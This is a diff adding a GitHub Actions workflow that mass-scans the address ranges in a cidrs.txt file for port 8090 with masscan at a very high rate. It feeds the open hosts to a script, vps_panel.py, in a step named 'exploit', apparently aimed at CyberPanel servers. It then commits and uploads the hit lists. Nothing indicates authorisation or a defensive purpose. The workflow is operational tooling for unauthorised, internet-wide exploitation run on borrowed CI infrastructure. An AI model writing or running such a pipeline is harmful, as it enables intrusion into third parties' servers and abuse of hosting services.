@@ -1,0 +1,39 @@
+name: cp2
+on: workflow_dispatch
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq masscan
+          pip install -q requests
+      - name: masscan 8090
+        run: |
+          sudo masscan -iL cidrs.txt -p8090 --rate 100000 -oL cp.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' cp.txt | sort -u > cp_hosts.txt
+          echo "=== 8090 open: $(wc -l < cp_hosts.txt) ==="
+      - name: exploit
+        run: python3 vps_panel.py cp_hosts.txt || true
+      - name: persist to repo
+        if: always()
+        run: |
+          cp /tmp/vps_panel_result.json cp_result.json 2>/dev/null || echo '{}' > cp_result.json
+          cp /tmp/vps_panel_hits.jsonl cp_hits.jsonl 2>/dev/null || true
+          cp cp_hosts.txt cp_hosts.txt 2>/dev/null || true
+          git config user.email kops@local; git config user.name kops
+          git add cp_result.json cp_hits.jsonl cp_hosts.txt 2>/dev/null || true
+          git commit -m "cyberpanel result $(date -u +%s)" 2>/dev/null || true
+          git push 2>/dev/null || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: cp2
+          path: |
+            cp_result.json
+            cp_hits.jsonl
+            cp_hosts.txt
+          if-no-files-found: warn
